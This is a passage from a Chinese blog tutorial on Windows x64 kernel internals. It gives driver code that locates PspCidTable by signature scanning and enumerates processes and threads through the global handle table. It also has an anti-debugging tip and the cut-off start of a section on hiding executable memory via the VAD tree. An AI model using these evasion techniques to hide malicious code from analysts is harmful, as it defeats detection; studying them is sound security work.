<p>可以看一下IDA：</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714205128464.png" alt="image-20220714205128464"></p>
<p>如上图可以看到其是在<code>ObTypeIndexTable</code>中获取对应的<code>OBJECT_TYPE</code>指针, 可以知道其是个<code>OBJECT_TYPE</code>指针数组, 获取公式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObTypeIndexTable[OBJECT_HEADER.TypeIndex ^ BYTE((OBJECT_HEADER地址 &gt;&gt; <span class="number">8</span>)) ^ ObHeaderCookie]</span><br></pre></td></tr></table></figure>

<h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>首先需要解决的问题是，获取<code>PspCidTable</code></p>
<p>win7：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsLookupProcessByProcessId（被导出） -&gt; PspCidTable</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>win10：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsLookupProcessByProcessId（被导出） -&gt; PspReferenceCidTableEntry -&gt; PspCidTable</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714210434972.png" alt="image-20220714210434972"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220714210523795.png" alt="image-20220714210523795"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 PspCidTable</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">get_PspCidTable</span><span class="params">(ULONG64* tableAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取 PsLookupProcessByProcessId 地址</span></span><br><span class="line">	UNICODE_STRING uc_funcName;</span><br><span class="line">	RtlInitUnicodeString(&amp;uc_funcName, <span class="string">L&quot;PsLookupProcessByProcessId&quot;</span>);</span><br><span class="line">	ULONG64 ul_funcAddr = MmGetSystemRoutineAddress(&amp;uc_funcName);</span><br><span class="line">	<span class="keyword">if</span> (ul_funcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="comment">//DbgPrint(&quot;[LYSM] MmGetSystemRoutineAddress error.\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] PsLookupProcessByProcessId:%p\n&quot;, ul_funcAddr);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 前 40 字节有 call（PspReferenceCidTableEntry）</span></span><br><span class="line">	ULONG64 ul_entry = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (*(PUCHAR)(ul_funcAddr + i) == <span class="number">0xe8</span>) &#123;</span><br><span class="line">			ul_entry = ul_funcAddr + i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ul_entry != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">// 解析 call 地址</span></span><br><span class="line">		INT i_callCode = *(INT*)(ul_entry + <span class="number">1</span>);</span><br><span class="line">		<span class="comment">//DbgPrint(&quot;[LYSM] i_callCode:%X\n&quot;, i_callCode);</span></span><br><span class="line">		ULONG64 ul_callJmp = ul_entry + i_callCode + <span class="number">5</span>;</span><br><span class="line">		<span class="comment">//DbgPrint(&quot;[LYSM] ul_callJmp:%p\n&quot;, ul_callJmp);</span></span><br><span class="line">		<span class="comment">// 来到 call（PspReferenceCidTableEntry） 内找 PspCidTable</span></span><br><span class="line">		<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (*(PUCHAR)(ul_callJmp + i) == <span class="number">0x48</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_callJmp + i + <span class="number">1</span>) == <span class="number">0x8b</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_callJmp + i + <span class="number">2</span>) == <span class="number">0x05</span>) &#123;</span><br><span class="line">				<span class="comment">// 解析 mov 地址</span></span><br><span class="line">				INT i_movCode = *(INT*)(ul_callJmp+i + <span class="number">3</span>);</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;[LYSM] i_movCode:%X\n&quot;, i_movCode);</span></span><br><span class="line">				ULONG64 ul_movJmp = ul_callJmp+i + i_movCode + <span class="number">7</span>;</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;[LYSM] ul_movJmp:%p\n&quot;, ul_movJmp);</span></span><br><span class="line">				<span class="comment">// 得到 PspCidTable</span></span><br><span class="line">				*tableAddr = ul_movJmp;</span><br><span class="line">				<span class="keyword">return</span> TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 前 40字节没有 call</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 直接在 PsLookupProcessByProcessId 找 PspCidTable</span></span><br><span class="line">		<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">70</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(*(PUCHAR)(ul_funcAddr + i) == <span class="number">0x49</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">1</span>) == <span class="number">0x8b</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">2</span>) == <span class="number">0xdc</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">3</span>) == <span class="number">0x48</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">4</span>) == <span class="number">0x8b</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">5</span>) == <span class="number">0xd1</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">6</span>) == <span class="number">0x48</span> &amp;&amp;</span><br><span class="line">				*(PUCHAR)(ul_funcAddr + i + <span class="number">7</span>) == <span class="number">0x8b</span>)&#123;</span><br><span class="line">				<span class="comment">// 解析 mov 地址</span></span><br><span class="line">				INT i_movCode = *(INT*)(ul_funcAddr+i+<span class="number">6</span> + <span class="number">3</span>);</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;[LYSM] i_movCode:%X\n&quot;, i_movCode);</span></span><br><span class="line">				ULONG64 ul_movJmp = ul_funcAddr+i+<span class="number">6</span> + i_movCode + <span class="number">7</span>;</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;[LYSM] ul_movJmp:%p\n&quot;, ul_movJmp);</span></span><br><span class="line">				<span class="comment">// 得到 PspCidTable</span></span><br><span class="line">				*tableAddr = ul_movJmp;</span><br><span class="line">				<span class="keyword">return</span> TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解析一级表</span></span><br><span class="line"><span class="comment">	BaseAddr：一级表的基地址</span></span><br><span class="line"><span class="comment">	index1：第几个一级表</span></span><br><span class="line"><span class="comment">	index2：第几个二级表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">VOID <span class="title">parse_table_1</span><span class="params">(ULONG64 BaseAddr,INT index1,INT index2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] BaseAddr 1:%p\n&quot;, BaseAddr);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取系统版本</span></span><br><span class="line">	RTL_OSVERSIONINFOEXW OSVersion = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	OSVersion.dwOSVersionInfoSize = <span class="keyword">sizeof</span>(RTL_OSVERSIONINFOEXW);</span><br><span class="line">	RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;OSVersion);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历一级表（每个表项大小 16 ），表大小 4k，所以遍历 4096/16 = 526 次</span></span><br><span class="line">	PEPROCESS p_eprocess = <span class="literal">NULL</span>;</span><br><span class="line">	PETHREAD p_ethread = <span class="literal">NULL</span>;</span><br><span class="line">	INT i_id = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!MmIsAddressValid((PVOID64)(BaseAddr + i * <span class="number">16</span>))) &#123; </span><br><span class="line">			<span class="comment">//DbgPrint(&quot;[LYSM] 非法地址:%p\n&quot;, BaseAddr + i * 16);</span></span><br><span class="line">			<span class="keyword">continue</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// win10</span></span><br><span class="line">		<span class="keyword">if</span> (OSVersion.dwMajorVersion == <span class="number">10</span> &amp;&amp; OSVersion.dwMinorVersion == <span class="number">0</span>) &#123;</span><br><span class="line">			ULONG64 ul_recode = *(PULONG64)(BaseAddr + i * <span class="number">16</span>);</span><br><span class="line">			<span class="comment">// 解密</span></span><br><span class="line">			ULONG64 ul_decode = (LONG64)ul_recode &gt;&gt; <span class="number">0x10</span>;</span><br><span class="line">			ul_decode &amp;= <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">			<span class="comment">// 判断是进程还是线程</span></span><br><span class="line">			i_id = i*<span class="number">4</span> + <span class="number">1024</span>*index1 + <span class="number">512</span>*index2*<span class="number">1024</span>;	</span><br><span class="line">			<span class="keyword">if</span> (PsLookupProcessByProcessId(i_id , &amp;p_eprocess) == STATUS_SUCCESS) &#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[LYSM] PID:%d , i:%d , addr:%p , object:%p\n&quot;</span>, i_id , i, BaseAddr + i*<span class="number">0x10</span>, ul_decode);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (PsLookupThreadByThreadId(i_id , &amp;p_ethread) == STATUS_SUCCESS) &#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[LYSM] TID:%d , i:%d , addr:%p , object:%p\n&quot;</span>, i_id , i, BaseAddr + i*<span class="number">0x10</span>, ul_decode);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// win7</span></span><br><span class="line">		<span class="keyword">if</span> (OSVersion.dwMajorVersion == <span class="number">6</span> &amp;&amp; OSVersion.dwMinorVersion == <span class="number">1</span>) &#123;</span><br><span class="line">			ULONG64 ul_recode = *(PULONG64)(BaseAddr + i * <span class="number">16</span>);</span><br><span class="line">			<span class="comment">// 解密</span></span><br><span class="line">			ULONG64 ul_decode = ul_recode &amp; <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">			<span class="comment">// 判断是进程还是线程</span></span><br><span class="line">			i_id = i*<span class="number">4</span> + <span class="number">1024</span>*index1 + <span class="number">512</span>*index2*<span class="number">1024</span>;</span><br><span class="line">			<span class="keyword">if</span> (PsLookupProcessByProcessId(i_id , &amp;p_eprocess) == STATUS_SUCCESS) &#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[LYSM] PID:%d , i:%d , addr:%p , object:%p\n&quot;</span>, i_id , i, BaseAddr + i*<span class="number">0x10</span>, ul_decode);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (PsLookupThreadByThreadId(i_id , &amp;p_ethread) == STATUS_SUCCESS) &#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[LYSM] TID:%d , i:%d , addr:%p , object:%p\n&quot;</span>, i_id , i, BaseAddr + i*<span class="number">0x10</span>, ul_decode);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解析二级表</span></span><br><span class="line"><span class="comment">	BaseAddr：二级表基地址</span></span><br><span class="line"><span class="comment">	index2：第几个二级表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">VOID <span class="title">parse_table_2</span><span class="params">(ULONG64 BaseAddr, INT index2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] BaseAddr 2:%p\n&quot;, BaseAddr);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历二级表（每个表项大小 8）,表大小 4k，所以遍历 4096/8 = 512 次</span></span><br><span class="line">	ULONG64 ul_baseAddr_1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!MmIsAddressValid((PVOID64)(BaseAddr + i * <span class="number">8</span>))) &#123; </span><br><span class="line">			<span class="comment">//DbgPrint(&quot;[LYSM] 非法二级表指针（1）:%p\n&quot;, BaseAddr + i * 8);</span></span><br><span class="line">			<span class="keyword">continue</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!MmIsAddressValid((PVOID64)*(PULONG64)(BaseAddr + i * <span class="number">8</span>))) &#123; </span><br><span class="line">			<span class="comment">//DbgPrint(&quot;[LYSM] 非法二级表指针（2）:%p\n&quot;, BaseAddr + i * 8);</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ul_baseAddr_1 = *(PULONG64)(BaseAddr + i * <span class="number">8</span>);</span><br><span class="line">		parse_table_1(ul_baseAddr_1, i, index2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解析三级表</span></span><br><span class="line"><span class="comment">	BaseAddr：三级表基地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">VOID <span class="title">parse_table_3</span><span class="params">(ULONG64 BaseAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] BaseAddr 3:%p\n&quot;, BaseAddr);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历三级表（每个表项大小 8）,表大小 4k，所以遍历 4096/8 = 512 次</span></span><br><span class="line">	ULONG64 ul_baseAddr_2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!MmIsAddressValid((PVOID64)(BaseAddr + i * <span class="number">8</span>))) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		<span class="keyword">if</span> (!MmIsAddressValid((PVOID64) * (PULONG64)(BaseAddr + i * <span class="number">8</span>))) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		ul_baseAddr_2 = *(PULONG64)(BaseAddr + i * <span class="number">8</span>);</span><br><span class="line">		parse_table_2(ul_baseAddr_2, i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 遍历进程和线程</span></span><br><span class="line"><span class="comment">	cidTableAddr：PspCidTable 地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">enum_PspCidTable</span><span class="params">(ULONG64 cidTableAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取 _HANDLE_TABLE 的 TableCode</span></span><br><span class="line">	ULONG64 ul_tableCode = *(PULONG64)(((ULONG64)*(PULONG64)cidTableAddr) + <span class="number">8</span>);</span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] ul_tableCode:%p\n&quot;, ul_tableCode);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 取低 2位（二级制11 = 3）</span></span><br><span class="line">	INT i_low2 = ul_tableCode &amp; <span class="number">3</span>;</span><br><span class="line">	<span class="comment">//DbgPrint(&quot;[LYSM] i_low2:%X\n&quot;, i_low2);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 一级表</span></span><br><span class="line">	<span class="keyword">if</span> (i_low2 == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">// TableCode 低 2位抹零（二级制11 = 3）</span></span><br><span class="line">		parse_table_1(ul_tableCode &amp; (~<span class="number">3</span>),<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 二级表</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (i_low2 == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="comment">// TableCode 低 2位抹零（二级制11 = 3）</span></span><br><span class="line">		parse_table_2(ul_tableCode &amp; (~<span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 三级表</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (i_low2 == <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="comment">// TableCode 低 2位抹零（二级制11 = 3）</span></span><br><span class="line">		parse_table_3(ul_tableCode &amp; (~<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[LYSM] i_low2 非法！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>除了进程遍历外，还可以用于<strong>反调试。</strong>一个进程加载进内存后，可以起一个线程，专门去遍历其他所有进程的句柄表，如果发现，某个进程的句柄表中有自己进程的句柄，说明自己的这个进程可能正在被调试，就算没有在被调试，也至少被打开了，这时就可以强行关闭自己的程序，不被调试，达到反调试的目的。</p>
<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>这一篇知识点比较多，其实主要还是围绕进程句柄表和全局句柄表，现在大多基于64位进行开发，但是网上很多资料都是32位的，参考性较小，所以这里参考了几篇博客进行了总结归纳。</p>
<p>首先从句柄表入手，X86下_HANDLE_TABLE_ENTRY结构大小为8，x64下结构大小为16，每张表4k大小4k/16=256，所以一张表可以存256个handle。二级三级表存放指针，x64下一个指针地址占用8字节，x86下占用4字节。4k/8=512。</p>
<p><code>EPROCESS</code>偏移0x570处有一个成员<code>ObjectTable</code>，查看该结构类型可以看到偏移0x8处是<code>TableCode</code>也就是句柄表地址，该地址后三位是有关句柄表是几级表的，该地址指向的是<code>OBJECT_HEADER</code>，该结构相当于链表的头部，需要加上0x30的偏移才能定位到真正的链表。</p>
<p>全局变量 <code>PspCidTable </code>存储了全局句柄表 <code>_HANDLE_TABLE </code>的地址，全局句柄表存储了所有 <code>EPROCESS </code>和 <code>ETHREAD</code> ，全局句柄表项<strong>低32位指向的就是内核对象，而非 <code>OBJECT_HEADER</code>。</strong></p>
<p>关于全局句柄表的<code>ObjectHeader</code>有一个TypeIndex字段，采用了XOR加密，可以采用公式解密，也可以利用导出函数<code>ObGetObjectType</code>,(<strong>0x7为进程，0x8为线程</strong>)</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://f5.pm/go-49551.html">x64下的全局句柄表解析</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/Simon798/article/details/106572336">x64遍历枚举</a>，<a target="_blank" rel="noopener" href="http://blog.leanote.com/post/only_the_brave/861cd6f40678">解析全局句柄表</a></p>
<h3 id="x64下隐藏可执行内存"><a href="#x64下隐藏可执行内存" class="headerlink" title="x64下隐藏可执行内存"></a>x64下隐藏可执行内存</h3><p>前面讲了PEB断链实现隐藏进程的效果，但是只是表面的进程隐藏，所有内存的详细信息都会被存储在vad树里面。</p>
<h4 id="vad"><a href="#vad" class="headerlink" title="vad"></a>vad</h4><p>内存管理器使用<strong>需求分页算法</strong>来知道何时将页面加载到内存中，直到线程引用地址并导致页面故障，然后再从磁盘中检索页面。与写时复制一样，需求分页是一种惰性评估的形式（等待直到需要时才执行任务。）</p>
<p>内存管理器使用惰性计算不仅可以将页面带入内存，还可以构造描述新页面所需的页面表。例如，当一个线程使用<code>VirtualAlloc</code>提交一个大区域的虚拟内存时，内存管理器可以立即构造访问已分配的整个内存范围所需的页面表。但如果其中一些范围从未被访问过呢？为整个范围创建页面表将是一个浪费时间的工作。相反，内存管理器等待创建一个页面表，直到线程导致页面故障。然后，它将为该页面创建一个页面表。这种方法显著提高了保留以及提交大量内存但访问量稀疏的进程的性能。</p>
<p>使用惰性计算算法，即使是很大的内存块也是一个快速的操作。当一个线程分配内存时，内存管理器必须响应该线程要使用的地址范围。为此，内存管理器维护另一组数据结构，以跟踪哪些虚拟地址已保留在进程的地址空间中，而哪些没有保留。这些数据结构被称为虚拟地址描述符(VADs)。VADs被分配在非分页池中。</p>
<p>VAD（虚拟地址描述符）是管理虚拟内存的，每一个进程有自己单独的一个VAD树，使用<code>VirtualAlloc</code>申请一个内存，则会在VAD树上增加一个结点，其是<code>_MMVAD</code>结构体</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718153145153.png" alt="image-20220718153145153"></p>
<p><code>StartingVpn</code>和这个<code>EndingVpn</code>是以页为单位</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718163930794.png" alt="image-20220718163930794"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718164517748.png" alt="image-20220718164517748"></p>
<p>在<code>EPROCESS</code>结构中偏移0x7d8处有一个<code>VadRoot</code>成员，其是根结点</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718161129090.png" alt="image-20220718161129090"></p>
<p>VADs被组织成一个自平衡的<code>AVL tree</code>（以其发明者阿德尔森-维尔斯基和兰迪斯的名字命名，其中任何节点的两个子子树的高度最多相差1；这使得插入、查找和删除非常快）。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718164732040.png" alt="image-20220718164732040"></p>
<p>通过下面可以看到<code>VadRoot</code>，采用指令<code>!vad 红框中地址</code>就可以查看到该进程的vad树</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718161413070.png" alt="image-20220718161413070"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718161736598.png" alt="image-20220718161736598"></p>
<p>由以上可知，可以通过<code>_EPROCESS.VadRoot</code>遍历VAD二叉树。进程内的所有用户模式线程使用<code>Thread Control Stack</code>上的不同内存区域（Shadow Stack），可以通过遍历进程的VAD自平衡二叉树（self-balancing AVL tree）获取描述进程Thread Control Stack的<code>_MMVAD</code>结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 